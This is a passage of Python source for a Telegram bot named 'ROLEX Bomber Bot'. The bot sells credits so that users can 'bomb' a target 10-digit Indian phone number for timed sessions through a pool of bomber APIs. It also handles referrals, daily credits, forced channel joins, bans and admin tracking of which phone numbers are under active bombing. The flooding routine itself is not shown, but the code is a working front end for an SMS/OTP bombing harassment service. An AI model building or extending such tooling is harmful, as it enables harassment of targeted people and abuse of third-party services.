               "adm_add_credits","adm_remove_credits","adm_reset_credits",
               "adm_ban_user","adm_unban_user","awaiting_phone"}
    if user_states.get(uid) not in PERSIST:
        user_states.pop(uid, None)

    if data == "verify_join":
        if is_user_joined(uid):
            try: bot.answer_callback_query(call.id, "✅ Verified. /start", show_alert=True)
            except Exception: pass
            try:
                bot.edit_message_text("✅ <b>Verified!</b>\n\nAb /start bhejein.",
                                      chat_id, mid)
            except Exception: pass
        else:
            try: bot.answer_callback_query(call.id,
                "❌ Abhi bhi join nahi kiya.", show_alert=True)
            except Exception: pass

    elif data == "main_menu":
        try: bot.answer_callback_query(call.id)
        except Exception: pass
        t = (f"⌚ <b>ROLEX Bomber Bot</b> 💣\n\n"
             f"💰 <code>{user['credits']}</code>\n\nChoose:")
        if BOT_PAUSED: t += "\n\n🔴 <b>Paused.</b>"
        try: bot.edit_message_text(t, chat_id, mid, reply_markup=main_menu_keyboard(uid))
        except Exception:
            try: bot.send_message(chat_id, t, reply_markup=main_menu_keyboard(uid))
            except Exception: pass

    elif data == "noop":
        try: bot.answer_callback_query(call.id)
        except Exception: pass

    elif data == "start_bombing":
        if BOT_PAUSED and uid not in ADMIN_IDS:
            try: bot.answer_callback_query(call.id, "🔴 Paused.", show_alert=True)
            except Exception: pass
            return
        if user["is_banned"]:
            try: bot.answer_callback_query(call.id, "🚫 Banned.", show_alert=True)
            except Exception: pass
            return
        if user["credits"] < 1:
            try: bot.answer_callback_query(call.id, "❌ No credits.", show_alert=True)
            except Exception: pass
            try:
                bot.edit_message_text(
                    f"❌ <b>No Credits</b>\n\nBalance: <code>{user['credits']}</code>\n\n"
                    f"💡 Daily claim or refer!",
                    chat_id, mid, reply_markup=back_keyboard())
            except Exception: pass
            return
        try: bot.answer_callback_query(call.id)
        except Exception: pass
        user_states[uid] = "awaiting_phone"
        try:
            bot.edit_message_text(
                f"📱 <b>Target Number</b>\n\n"
                f"Example: <code>9876543210</code>\n\n"
                f"💰 Credits: <code>{user['credits']}</code>\n"
                f"⏱ 1 credit = 5 min\n\n<i>/cancel to abort</i>",
                chat_id, mid, reply_markup=back_keyboard())
        except Exception:
            try:
                bot.send_message(chat_id, "📱 Send 10-digit number. /cancel to abort.",
                                 reply_markup=back_keyboard())
            except Exception: pass

    elif data == "my_profile":
        try: bot.answer_callback_query(call.id)
        except Exception: pass
        daily = user["last_daily_claim"] == datetime.now().date().isoformat()
        try:
            j = datetime.fromisoformat(user["joined_date"]).strftime("%Y-%m-%d")
        except Exception:
            j = "N/A"
        t = (f"👤 <b>My Profile</b>\n\n"
             f"🆔 <code>{esc(user['user_id'])}</code>\n"
             f"👤 @{esc(user['username'] or 'N/A')}\n"
             f"💰 <code>{user['credits']}</code>\n"
             f"💣 <code>{user['total_bombings']}</code>\n"
             f"👥 <code>{user['refer_count']}</code>\n"
             f"📅 <code>{j}</code>\n"
             f"🎁 Daily: {'✅' if daily else '❌'}\n\n"
             f"━━━━━━━━━━━━━━━━━━━━\n⌚ <b>ROLEX</b>")
        try: bot.edit_message_text(t, chat_id, mid, reply_markup=back_keyboard())
        except Exception:
            try: bot.send_message(chat_id, t, reply_markup=back_keyboard())
            except Exception: pass

    elif data == "my_stats":
        try: bot.answer_callback_query(call.id)
        except Exception: pass
        row = _exec("SELECT COUNT(*), COALESCE(SUM(credits_used),0), "
                    "COALESCE(SUM(duration),0) FROM sessions WHERE user_id=%s",
                    (str(uid),), fetch="one")
        t = (f"📊 <b>My Stats</b>\n\n"
             f"💣 <code>{user['total_bombings']}</code>\n"
             f"📁 <code>{row[0]}</code>\n"
             f"💰 <code>{row[1]}</code>\n"
             f"⏱ <code>{row[2]//60} min</code>\n"
             f"👥 <code>{user['refer_count']}</code>\n"
             f"💳 <code>{user['credits']}</code>\n\n"
             f"━━━━━━━━━━━━━━━━━━━━\n⌚ <b>ROLEX</b>")
        try: bot.edit_message_text(t, chat_id, mid, reply_markup=back_keyboard())
        except Exception:
            try: bot.send_message(chat_id, t, reply_markup=back_keyboard())
            except Exception: pass

    elif data == "refer_earn":
        try: bot.answer_callback_query(call.id)
        except Exception: pass
        try: bn = bot.get_me().username
        except Exception: bn = "your_bot"
        link = f"https://t.me/{bn}?start=ref_{uid}"
        t = (f"🎁 <b>Refer & Earn</b>\n\n"
             f"👥 <code>{user['refer_count']}</code>\n"
             f"💰 <code>{user['refer_count'] * REFER_BONUS_CREDITS}</code>\n\n"
             f"• You: +{REFER_BONUS_CREDITS}\n"
             f"• Friend: +{REFERRED_BONUS_CREDITS}\n\n"
             f"🔗 <code>{link}</code>\n\n"
             f"━━━━━━━━━━━━━━━━━━━━\n⌚ <b>ROLEX</b>")
        k = types.InlineKeyboardMarkup(row_width=1)
        k.add(types.InlineKeyboardButton("📤 Share",
                url=f"https://t.me/share/url?url={link}&text=Join ROLEX Bomber!"))
        k.add(types.InlineKeyboardButton("🔙 Back", callback_data="main_menu"))
        try: bot.edit_message_text(t, chat_id, mid, reply_markup=k)
        except Exception:
            try: bot.send_message(chat_id, t, reply_markup=k)
            except Exception: pass

    elif data == "daily_claim":
        today = datetime.now().date().isoformat()
        if not claim_daily(uid, today):
            try: bot.answer_callback_query(call.id, "⏰ Already claimed.", show_alert=True)
            except Exception: pass
            return
        try: bot.answer_callback_query(call.id,
            f"🎉 +{DAILY_FREE_CREDITS} credits!", show_alert=True)
        except Exception: pass
        nu = get_user(uid)
        try:
            bot.edit_message_text(
                f"🎉 <b>Daily Claimed!</b>\n\n"
                f"💰 +{DAILY_FREE_CREDITS}\n"
                f"💳 <code>{nu['credits']}</code>\n\n⌚ <b>ROLEX</b>",
                chat_id, mid, reply_markup=main_menu_keyboard(uid))
        except Exception: pass

    elif data == "stop_menu":
        try: bot.answer_callback_query(call.id)
        except Exception: pass
        a = active_bombings.get(str(uid))
        t = (f"🛑 <b>Stop Menu</b>\n\n"
             f"📱 <code>{esc(a.get('phone','?'))}</code>\n\nTap to stop."
             if a else "🛑 <b>Stop Menu</b>\n\nℹ️ No active bombing.")
        try: bot.edit_message_text(t, chat_id, mid, reply_markup=stop_menu_keyboard(uid))
        except Exception:
            try: bot.send_message(chat_id, t, reply_markup=stop_menu_keyboard(uid))
            except Exception: pass

    elif data == "stop_my_bombing":
        e = active_bombings.get(str(uid))
        if e is not None:
            e["stop"] = True
            try: bot.answer_callback_query(call.id, "🛑 Stopping...", show_alert=True)
            except Exception: pass
            try:
                bot.edit_message_text("🛑 <b>Stop requested.</b>",
                                      chat_id, mid, reply_markup=back_keyboard())
            except Exception: pass
        else:
            try: bot.answer_callback_query(call.id, "❌ None active.", show_alert=True)
            except Exception: pass

    elif data == "help_menu":
        try: bot.answer_callback_query(call.id)
        except Exception: pass
        t = (f"🆘 <b>Help</b>\n\n"
             f"<b>💣 Bomb:</b>\n1. Start Bombing\n2. 10-digit number\n"
             f"3. Credits\n4. Live status\n\n"
             f"<b>💰 Credits:</b>\n• 1 = 5 min\n"
             f"• Daily +{DAILY_FREE_CREDITS}\n• Refer +{REFER_BONUS_CREDITS}\n\n"
             f"⚡ <b>{len(BOMBER_APIS)} APIs loaded</b>\n\n"
             f"━━━━━━━━━━━━━━━━━━━━\n⌚ <b>ROLEX</b>")
        try: bot.edit_message_text(t, chat_id, mid, reply_markup=back_keyboard())
        except Exception:
            try: bot.send_message(chat_id, t, reply_markup=back_keyboard())
            except Exception: pass

    elif data == "admin_panel":
        if uid not in ADMIN_IDS:
            try: bot.answer_callback_query(call.id, "❌ Unauthorized.", show_alert=True)
            except Exception: pass
            return
        try: bot.answer_callback_query(call.id)
        except Exception: pass
        t = (f"⚙️ <b>Admin Panel</b>\n\n"
             f"Status: <b>{'🔴 PAUSED' if BOT_PAUSED else '🟢 RUNNING'}</b>\n"
             f"Active: <code>{len(active_bombings)}</code>\n"
             f"APIs: <code>{len(BOMBER_APIS)}</code>\n"
             f"Workers: <code>{CONCURRENT_WORKERS}</code>\n"
             f"Uptime: <code>{int(time.time() - BOT_START_TIME)}s</code>")
        try: bot.edit_message_text(t, chat_id, mid, reply_markup=admin_keyboard())
        except Exception:
            try: bot.send_message(chat_id, t, reply_markup=admin_keyboard())
            except Exception: pass

    elif data == "adm_credits":
        if uid not in ADMIN_IDS: return
        try: bot.answer_callback_query(call.id)
        except Exception: pass
        try:
            bot.edit_message_text("💰 <b>Credit Manager</b>", chat_id, mid,
                                  reply_markup=admin_credits_keyboard())
        except Exception: pass

    elif data == "adm_ban":
        if uid not in ADMIN_IDS: return
        try: bot.answer_callback_query(call.id)
        except Exception: pass
        try:
            bot.edit_message_text("🚫 <b>Ban Manager</b>", chat_id, mid,
                                  reply_markup=admin_ban_keyboard())
        except Exception: pass

    elif data == "adm_add_credits":
        if uid not in ADMIN_IDS: return
        user_states[uid] = "adm_add_credits"
        try: bot.answer_callback_query(call.id)
        except Exception: pass
        try:
            bot.edit_message_text("➕ <b>Add Credits</b>\n\nSend <code>USER_ID AMOUNT</code>",
                                  chat_id, mid, reply_markup=admin_credits_keyboard())
        except Exception: pass

    elif data == "adm_remove_credits":
        if uid not in ADMIN_IDS: return
        user_states[uid] = "adm_remove_credits"
        try: bot.answer_callback_query(call.id)
        except Exception: pass
        try:
            bot.edit_message_text("➖ <b>Remove Credits</b>\n\nSend <code>USER_ID AMOUNT</code>",
                                  chat_id, mid, reply_markup=admin_credits_keyboard())
        except Exception: pass

    elif data == "adm_reset_credits":
        if uid not in ADMIN_IDS: return
        user_states[uid] = "adm_reset_credits"
        try: bot.answer_callback_query(call.id)
        except Exception: pass
        try:
            bot.edit_message_text("🔄 <b>Reset Credits</b>\n\nSend USER_ID",
                                  chat_id, mid, reply_markup=admin_credits_keyboard())
        except Exception: pass

    elif data == "adm_ban_user":
        if uid not in ADMIN_IDS: return
        user_states[uid] = "adm_ban_user"
        try: bot.answer_callback_query(call.id)
        except Exception: pass
        try:
            bot.edit_message_text("🚫 <b>Ban User</b>\n\nSend USER_ID",
                                  chat_id, mid, reply_markup=admin_ban_keyboard())
        except Exception: pass

    elif data == "adm_unban_user":
        if uid not in ADMIN_IDS: return
        user_states[uid] = "adm_unban_user"
        try: bot.answer_callback_query(call.id)
        except Exception: pass
        try:
            bot.edit_message_text("✅ <b>Unban User</b>\n\nSend USER_ID",
                                  chat_id, mid, reply_markup=admin_ban_keyboard())
        except Exception: pass

    elif data == "adm_status":
        if uid not in ADMIN_IDS: return
        try: bot.answer_callback_query(call.id)
        except Exception: pass
        s = get_stats_row()
        hits = BOT_STATS["api_hits"]; succ = BOT_STATS["api_success"]
        hr = (succ / hits * 100) if hits else 0
        t = (f"📊 <b>Live Status</b>\n\n"
             f"Bot: <b>{'🔴 PAUSED' if BOT_PAUSED else '🟢 RUNNING'}</b>\n"
             f"Uptime: <code>{int(time.time() - BOT_START_TIME)}s</code>\n\n"
             f"👥 <code>{s['users']}</code> (banned: <code>{s['banned']}</code>)\n"
             f"💣 <code>{s['sessions']}</code>\n"
             f"⚡ <code>{len(active_bombings)}</code>\n"
             f"💰 <code>{s['credits']}</code>\n"
             f"🔗 <code>{len(BOMBER_APIS)}</code>\n\n"
             f"Hit rate: <code>{hr:.1f}%</code>")
        try: bot.edit_message_text(t, chat_id, mid, reply_markup=admin_keyboard())
        except Exception: pass

    elif data == "adm_full_stats":
        if uid not in ADMIN_IDS: return
        try: bot.answer_callback_query(call.id)
        except Exception: pass
        s = get_stats_row()
        hits = BOT_STATS["api_hits"]; succ = BOT_STATS["api_success"]
        cmds = BOT_STATS["commands_handled"]; started = BOT_STATS["bombings_started"]
        hr = (succ / hits * 100) if hits else 0
        t = (f"📈 <b>Full Stats</b>\n\n"
             f"👥 Users: <code>{s['users']}</code> (banned: <code>{s['banned']}</code>)\n"
             f"💣 Sessions: <code>{s['sessions']}</code>\n"
             f"⚡ Active: <code>{len(active_bombings)}</code>\n\n"
             f"Commands: <code>{cmds}</code>\n"
             f"Started: <code>{started}</code>\n"
             f"Hits: <code>{hits}</code>\n"
             f"Success: <code>{hr:.1f}%</code>\n"
             f"Uptime: <code>{int(time.time() - BOT_START_TIME)}s</code>\n\n"
             f"APIs: <code>{len(BOMBER_APIS)}</code>\n"
             f"Workers: <code>{CONCURRENT_WORKERS}</code>")
        try: bot.edit_message_text(t, chat_id, mid, reply_markup=admin_keyboard())
        except Exception: pass

    elif data == "adm_channel_manager":
        if uid not in ADMIN_IDS: return
        try: bot.answer_callback_query(call.id)
        except Exception: pass
        chans = get_all_channels()
        t = (f"🔒 <b>Force-Join Manager</b>\n\n"
             f"Total: <code>{len(chans)}</code>\n"
             f"Enabled: <code>{sum(1 for c in chans if c['enabled'])}</code>\n"
             f"Global: <b>{'ON' if FORCE_JOIN_ENABLED else 'OFF'}</b>\n\n"
             f"Tap to toggle.")
        try: bot.edit_message_text(t, chat_id, mid,
                                   reply_markup=channel_manager_keyboard())
        except Exception:
            try: bot.send_message(chat_id, t, reply_markup=channel_manager_keyboard())
            except Exception: pass

    elif data == "adm_ch_add":
        if uid not in ADMIN_IDS: return
        user_states[uid] = "adm_awaiting_channel"
        try: bot.answer_callback_query(call.id)
        except Exception: pass
        try:
            bot.edit_message_text(
                "➕ <b>Add Channel</b>\n\n"
                "Send: <code>@username | Display Name</code>\n"
                "or: <code>-1001234567890 | Name</code>\n\n"
                "<i>Bot must be admin in that channel.</i>",
                chat_id, mid, reply_markup=channel_manager_keyboard())
        except Exception: pass

    elif data == "adm_ch_remove_menu":
        if uid not in ADMIN_IDS: return
        try: bot.answer_callback_query(call.id)
        except Exception: pass
        try:
            bot.edit_message_text("❌ <b>Remove Channel</b>", chat_id, mid,
                                  reply_markup=channel_remove_keyboard())
        except Exception: pass

    elif data.startswith("adm_ch_toggle_"):
        if uid not in ADMIN_IDS: return
        cid = data[len("adm_ch_toggle_"):]
        ns = toggle_channel(cid)
        if ns is None:
            try: bot.answer_callback_query(call.id, "❌ Not found.", show_alert=True)
            except Exception: pass
        else:
            try: bot.answer_callback_query(call.id,
                f"{'🟢 Enabled' if ns else '🔴 Disabled'}")
            except Exception: pass
        chans = get_all_channels()
        t = (f"🔒 <b>Force-Join Manager</b>\n\n"
             f"Total: <code>{len(chans)}</code>\n"
             f"Enabled: <code>{sum(1 for c in chans if c['enabled'])}</code>\n\n"
             f"Tap to toggle.")
        try: bot.edit_message_text(t, chat_id, mid,
                                   reply_markup=channel_manager_keyboard())
        except Exception: pass

    elif data.startswith("adm_ch_remove_"):
        if uid not in ADMIN_IDS: return
        cid = data[len("adm_ch_remove_"):]
        if remove_channel(cid):
            try: bot.answer_callback_query(call.id, "✅ Removed.", show_alert=True)
            except Exception: pass
        else:
            try: bot.answer_callback_query(call.id, "❌ Not found.", show_alert=True)
            except Exception: pass
        try:
            bot.edit_message_text("❌ <b>Remove Channel</b>", chat_id, mid,
                                  reply_markup=channel_remove_keyboard())
        except Exception: pass

    elif data == "adm_lookup":
        if uid not in ADMIN_IDS: return
        try: bot.answer_callback_query(call.id)
        except Exception: pass
        user_states[uid] = "adm_awaiting_uid"
        try:
            bot.edit_message_text("👥 <b>User Lookup</b>\n\nSend USER_ID",
                                  chat_id, mid, reply_markup=back_keyboard())
        except Exception: pass

    elif data == "adm_stop_bot":
        if uid not in ADMIN_IDS: return
        BOT_PAUSED = True
        try: bot.answer_callback_query(call.id, "🔴 Paused.", show_alert=True)
        except Exception: pass
        try:
            bot.edit_message_text("🔴 <b>Bot PAUSED</b>", chat_id, mid,
                                  reply_markup=admin_keyboard())
        except Exception: pass

    elif data == "adm_start_bot":
        if uid not in ADMIN_IDS: return
        BOT_PAUSED = False
        try: bot.answer_callback_query(call.id, "🟢 Resumed.", show_alert=True)
        except Exception: pass
        try:
            bot.edit_message_text("🟢 <b>Bot RUNNING</b>", chat_id, mid,
                                  reply_markup=admin_keyboard())
        except Exception: pass

    elif data == "adm_broadcast":
        if uid not in ADMIN_IDS: return
        try: bot.answer_callback_query(call.id)
        except Exception: pass
        user_states[uid] = "adm_awaiting_broadcast"
        try:
            bot.edit_message_text("📢 <b>Broadcast</b>\n\nSend message. /cancel aborts.",
                                  chat_id, mid, reply_markup=back_keyboard())
        except Exception: pass

    elif data == "adm_active":
        if uid not in ADMIN_IDS: return
        try: bot.answer_callback_query(call.id)
        except Exception: pass
        if not active_bombings:
            t = "💥 <b>Active</b>\n\n<i>None.</i>"
        else:
            t = f"💥 <b>Active ({len(active_bombings)})</b>\n\n"
            for u, i in list(active_bombings.items()):
                t += f"• <code>{esc(u)}</code> → <code>{esc(i.get('phone','?'))}</code>\n"
        try: bot.edit_message_text(t, chat_id, mid, reply_markup=admin_keyboard())
        except Exception: pass

    elif data == "adm_clear_bombings":
        if uid not in ADMIN_IDS: return
        c = 0
        with _bomb_lock:
            for k in list(active_bombings.keys()):
                e = active_bombings.get(k)
                if e is not None:
                    e["stop"] = True
                    c += 1
        try: bot.answer_callback_query(call.id, f"Stopped {c}.", show_alert=True)
        except Exception: pass
        try:
            bot.edit_message_text(f"🧹 <b>Cleared {c}.</b>", chat_id, mid,
                                  reply_markup=admin_keyboard())
        except Exception: pass

    elif data == "adm_backup":
        if uid not in ADMIN_IDS: return
        try: bot.answer_callback_query(call.id)
        except Exception: pass
        # Postgres — no file to send. Dump user table as JSON.
        try:
            rows = _exec("SELECT * FROM users", fetch="all")
            payload = "\n".join(str(r) for r in rows) or "(empty)"
            import io
            f = io.BytesIO(payload.encode())
            f.name = f"users_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            bot.send_document(chat_id, f, caption="💾 users table dump")
        except Exception as e:
            try: bot.send_message(chat_id, f"❌ {esc(e)}")
            except Exception: pass

    elif data == "cancel_action":
        try: bot.answer_callback_query(call.id, "Cancelled.")
        except Exception: pass
        try:
            bot.edit_message_text("❌ Cancelled.", chat_id, mid,
                                  reply_markup=main_menu_keyboard(uid))
        except Exception:
            try: bot.send_message(chat_id, "❌ Cancelled.",
                                  reply_markup=main_menu_keyboard(uid))
            except Exception: pass

    else:
        try: bot.answer_callback_query(call.id, "Unknown action.", show_alert=False)
        except Exception: pass

# ============= TEXT HANDLER =============
@bot.message_handler(func=lambda m: True, content_types=['text'])
def text_handler(message):
    _bump("commands_handled")
    uid = message.from_user.id
    chat_id = message.chat.id
    text = message.text.strip()

    if text == "/cancel":
        user_states.pop(uid, None)
        bot.send_message(chat_id, "❌ Cancelled.", reply_markup=main_menu_keyboard(uid))
        return
    if text.startswith("/"):
        return

    state = user_states.get(uid)

    if (FORCE_JOIN_ENABLED and uid not in ADMIN_IDS and not is_user_joined(uid)):
        bot.send_message(chat_id, force_join_message(),
                         reply_markup=force_join_keyboard())
        return

    if BOT_PAUSED and uid not in ADMIN_IDS and state not in (
            "adm_awaiting_broadcast","adm_awaiting_uid","adm_add_credits",
            "adm_remove_credits","adm_reset_credits","adm_ban_user",
            "adm_unban_user","adm_awaiting_channel"):
        bot.send_message(chat_id, "🔴 Bot paused.")
        return

    if state == "adm_awaiting_channel" and uid in ADMIN_IDS:
        user_states.pop(uid, None)
        if "|" not in text:
            return bot.send_message(chat_id,
                "❌ Format: <code>@user | Name</code>",
                reply_markup=channel_manager_keyboard())
        cid, name = [x.strip() for x in text.split("|",1)]
        try:
            co = bot.get_chat(cid)
            title = co.title or name
            if cid.startswith("@"):
                url = f"https://t.me/{cid[1:]}"
            elif getattr(co, "username", None):
                url = f"https://t.me/{co.username}"
            else:
                try: url = bot.export_chat_invite_link(cid)
                except Exception as e:
                    return bot.send_message(chat_id,
                        f"❌ Bot needs admin+invite permission.\n<i>{esc(str(e)[:150])}</i>",
                        reply_markup=channel_manager_keyboard())
        except Exception as e:
            return bot.send_message(chat_id,
                f"❌ Can't access {esc(cid)}. Bot must be admin.\n<i>{esc(str(e)[:200])}</i>",
                reply_markup=channel_manager_keyboard())
        if not add_channel(cid, title, url):
            return bot.send_message(chat_id,
                f"⚠️ Already exists or DB fail.",
                reply_markup=channel_manager_keyboard())
        bot.send_message(chat_id,
            f"✅ <b>Added</b>\n{esc(title)}\n<code>{esc(cid)}</code>",
            reply_markup=channel_manager_keyboard())
        return

    if state == "awaiting_phone":
        user_states.pop(uid, None)
        phone = re.sub(r'[^0-9]', '', text)
        if len(phone) == 12 and phone.startswith("91"):
            phone = phone[2:]
        if not re.match(r'^[6-9][0-9]{9}$', phone):
            bot.send_message(chat_id,
                "❌ Invalid. 10-digit Indian number (6-9).\n"
                "Example: <code>9876543210</code>",
                reply_markup=back_keyboard())
            return
        user = get_user(uid)
        if not user or user["credits"] < 1:
            bot.send_message(chat_id, "❌ No credits.",
                             reply_markup=back_keyboard())
            return
        kb = types.InlineKeyboardMarkup(row_width=2)
        mx = min(user["credits"], 10)
        btns = [types.InlineKeyboardButton(
            f"{i} ({i*5}min)", callback_data=f"use_credits_{phone}_{i}")
            for i in range(1, mx+1)]
        for i in range(0, len(btns), 2):
            kb.row(*btns[i:i+2])
        kb.add(types.InlineKeyboardButton("🔙 Cancel", callback_data="cancel_action"))
        bot.send_message(chat_id,
            f"📱 <b>{esc(phone)}</b>\n"
            f"💰 <code>{user['credits']}</code>\n\nSelect credits:",
            reply_markup=kb)
        return

    if state == "adm_add_credits" and uid in ADMIN_IDS:
        user_states.pop(uid, None)
        parts = text.split()
        if len(parts) != 2 or not parts[0].isdigit() or not parts[1].lstrip("-").isdigit():
            return bot.send_message(chat_id, "❌ USER_ID AMOUNT",
                                    reply_markup=admin_credits_keyboard())
        t, a = parts[0], int(parts[1])
        if a <= 0:
            return bot.send_message(chat_id, "❌ Positive only.",
                                    reply_markup=admin_credits_keyboard())
        if not get_user(t):
            return bot.send_message(chat_id, f"❌ No user {esc(t)}.",
                                    reply_markup=admin_credits_keyboard())
        add_credits(t, a)
        u = get_user(t)
        bot.send_message(chat_id,
            f"✅ +{a} to <code>{esc(t)}</code>. Balance: <code>{u['credits']}</code>",
            reply_markup=admin_credits_keyboard())
        try: bot.send_message(int(t), f"🎁 +{a} credits!\n\n⌚ <b>ROLEX</b>")
        except Exception: pass
        return

    if state == "adm_remove_credits" and uid in ADMIN_IDS:
        user_states.pop(uid, None)
        parts = text.split()
        if len(parts) != 2 or not parts[0].isdigit() or not parts[1].isdigit():
            return bot.send_message(chat_id, "❌ USER_ID AMOUNT",
                                    reply_markup=admin_credits_keyboard())
        t, a = parts[0], int(parts[1])
        if not get_user(t):
            return bot.send_message(chat_id, f"❌ No user {esc(t)}.",
                                    reply_markup=admin_credits_keyboard())
        sub_credits(t, a)
        u = get_user(t)
        bot.send_message(chat_id,
            f"✅ -{a} from <code>{esc(t)}</code>. Balance: <code>{u['credits']}</code>",
            reply_markup=admin_credits_keyboard())
        return

    if state == "adm_reset_credits" and uid in ADMIN_IDS:
        user_states.pop(uid, None)
        t = text.strip()
        if not t.isdigit() or not get_user(t):
            return bot.send_message(chat_id, "❌ Invalid USER_ID.",
                                    reply_markup=admin_credits_keyboard())
        update_user(t, credits=0)
        bot.send_message(chat_id, f"✅ Reset {esc(t)} to 0.",
                         reply_markup=admin_credits_keyboard())
        return

    if state == "adm_ban_user" and uid in ADMIN_IDS:
        user_states.pop(uid, None)
        t = text.strip()
        if not t.isdigit() or not get_user(t):
            return bot.send_message(chat_id, "❌ Invalid USER_ID.",
                                    reply_markup=admin_ban_keyboard())
        update_user(t, is_banned=1)
        with _bomb_lock:
            e = active_bombings.get(str(t))
            if e is not None: e["stop"] = True
        bot.send_message(chat_id, f"🚫 Banned {esc(t)}.",
                         reply_markup=admin_ban_keyboard())
        return

    if state == "adm_unban_user" and uid in ADMIN_IDS:
        user_states.pop(uid, None)
        t = text.strip()
        if not t.isdigit() or not get_user(t):
            return bot.send_message(chat_id, "❌ Invalid USER_ID.",
                                    reply_markup=admin_ban_keyboard())
        update_user(t, is_banned=0)
        bot.send_message(chat_id, f"✅ Unbanned {esc(t)}.",
                         reply_markup=admin_ban_keyboard())
        return

    if state == "adm_awaiting_uid" and uid in ADMIN_IDS:
        user_states.pop(uid, None)
        t = text.strip()
        if not t.isdigit():
            return bot.send_message(chat_id, "❌ Invalid.",
                                    reply_markup=admin_keyboard())
        u = get_user(t)
        if not u:
            return bot.send_message(chat_id, f"❌ No user {esc(t)}.",
                                    reply_markup=admin_keyboard())
        try:
            j = datetime.fromisoformat(u["joined_date"]).strftime("%Y-%m-%d %H:%M")
        except Exception:
            j = "N/A"
        bot.send_message(chat_id,
            f"👤 <b>User</b>\n\n"
            f"🆔 <code>{esc(u['user_id'])}</code>\n"
            f"👤 @{esc(u['username'] or 'N/A')}\n"
            f"💰 <code>{u['credits']}</code>\n"
            f"💣 <code>{u['total_bombings']}</code>\n"
            f"👥 <code>{u['refer_count']}</code>\n"
            f"🔗 <code>{esc(u['referred_by'] or '—')}</code>\n"
            f"📅 <code>{j}</code>\n"
            f"🚫 <b>{'YES' if u['is_banned'] else 'NO'}</b>\n"
            f"⚡ <b>{'YES' if str(t) in active_bombings else 'NO'}</b>",
            reply_markup=admin_keyboard())
        return

    if state == "adm_awaiting_broadcast" and uid in ADMIN_IDS:
        user_states.pop(uid, None)
        if not text.strip():
            return bot.send_message(chat_id, "❌ Empty.",
                                    reply_markup=admin_keyboard())
        _do_broadcast(chat_id, text)
        return

    bot.send_message(chat_id, "Send /start to open menu.",
                     reply_markup=main_menu_keyboard(uid))

# ============= ADMIN COMMANDS =============
def _is_admin(m):
    return m.from_user.id in ADMIN_IDS

@bot.message_handler(commands=['addcredits'])
def cmd_addcredits(m):
    if not _is_admin(m): return bot.reply_to(m, "❌")
    p = m.text.split()
    if len(p) != 3: return bot.reply_to(m, "Usage: /addcredits UID AMT")
    try:
        t, a = p[1], int(p[2])
        if not get_user(t): return bot.reply_to(m, f"❌ No user {esc(t)}.")
        add_credits(t, a); u = get_user(t)
        bot.reply_to(m, f"✅ +{a} → {esc(t)}. Bal: {u['credits']}")
        try: bot.send_message(int(t), f"🎁 +{a} credits!")
        except Exception: pass
    except Exception as e:
        bot.reply_to(m, f"❌ {esc(e)}")

@bot.message_handler(commands=['removecredits'])
def cmd_removecredits(m):
    if not _is_admin(m): return bot.reply_to(m, "❌")
    p = m.text.split()
    if len(p) != 3: return bot.reply_to(m, "Usage: /removecredits UID AMT")
    try:
        t, a = p[1], int(p[2])
        if not get_user(t): return bot.reply_to(m, f"❌ No user {esc(t)}.")
        sub_credits(t, a); u = get_user(t)
        bot.reply_to(m, f"✅ -{a} → {esc(t)}. Bal: {u['credits']}")
    except Exception as e:
        bot.reply_to(m, f"❌ {esc(e)}")

@bot.message_handler(commands=['resetcredits'])
def cmd_resetcredits(m):
    if not _is_admin(m): return bot.reply_to(m, "❌")
    p = m.text.split()
    if len(p) != 2: return bot.reply_to(m, "Usage: /resetcredits UID")
    t = p[1]
    if not get_user(t): return bot.reply_to(m, f"❌ No user {esc(t)}.")
    update_user(t, credits=0)
    bot.reply_to(m, f"✅ Reset {esc(t)}.")

@bot.message_handler(commands=['ban'])
def cmd_ban(m):
    if not _is_admin(m): return bot.reply_to(m, "❌")
    p = m.text.split()
    if len(p) != 2: return bot.reply_to(m, "Usage: /ban UID")
    t = p[1]
    if not get_user(t): return bot.reply_to(m, f"❌ No user {esc(t)}.")
    update_user(t, is_banned=1)
    with _bomb_lock:
        e = active_bombings.get(str(t))
        if e is not None: e["stop"] = True
    bot.reply_to(m, f"🚫 Banned {esc(t)}.")

@bot.message_handler(commands=['unban'])
def cmd_unban(m):
    if not _is_admin(m): return bot.reply_to(m, "❌")
    p = m.text.split()
    if len(p) != 2: return bot.reply_to(m, "Usage: /unban UID")
    t = p[1]
    if not get_user(t): return bot.reply_to(m, f"❌ No user {esc(t)}.")
    update_user(t, is_banned=0)
    bot.reply_to(m, f"✅ Unbanned {esc(t)}.")

@bot.message_handler(commands=['userinfo'])
def cmd_userinfo(m):
    if not _is_admin(m): return bot.reply_to(m, "❌")
    p = m.text.split()
    if len(p) != 2: return bot.reply_to(m, "Usage: /userinfo UID")
    t = p[1]; u = get_user(t)
    if not u: return bot.reply_to(m, f"❌ No user {esc(t)}.")
    try:
        j = datetime.fromisoformat(u["joined_date"]).strftime("%Y-%m-%d %H:%M")
    except Exception:
        j = "N/A"
    bot.reply_to(m,
        f"👤 <b>User Info</b>\n\n"
        f"🆔 <code>{esc(u['user_id'])}</code>\n"
        f"👤 @{esc(u['username'] or 'N/A')}\n"
        f"💰 <code>{u['credits']}</code>\n"
        f"💣 <code>{u['total_bombings']}</code>\n"
        f"👥 <code>{u['refer_count']}</code>\n"
        f"🔗 <code>{esc(u['referred_by'] or '—')}</code>\n"
        f"📅 <code>{j}</code>\n"
        f"🚫 <b>{'YES' if u['is_banned'] else 'NO'}</b>\n"
        f"⚡ <b>{'YES' if str(t) in active_bombings else 'NO'}</b>")

@bot.message_handler(commands=['stats'])
def cmd_stats(m):
    if not _is_admin(m): return bot.reply_to(m, "❌")
    s = get_stats_row()
    hits = BOT_STATS["api_hits"]; succ = BOT_STATS["api_success"]
    hr = (succ / hits * 100) if hits else 0
    bot.reply_to(m,
        f"📊 <b>Stats</b>\n\n"
        f"👥 <code>{s['users']}</code> (banned: <code>{s['banned']}</code>)\n"
        f"💣 <code>{s['sessions']}</code>\n"
        f"⚡ <code>{len(active_bombings)}</code>\n"
        f"💰 <code>{s['credits']}</code>\n"
        f"🔗 <code>{len(BOMBER_APIS)}</code>\n\n"
        f"Hits: <code>{hits}</code>\n"
        f"Success: <code>{hr:.1f}%</code>\n"
        f"Uptime: <code>{int(time.time() - BOT_START_TIME)}s</code>")

@bot.message_handler(commands=['broadcast'])
def cmd_broadcast(m):
    if not _is_admin(m): return bot.reply_to(m, "❌")
    p = (m.text or "").split(maxsplit=1)
    if len(p) < 2 or not p[1].strip():
        return bot.reply_to(m, "Usage: /broadcast message")
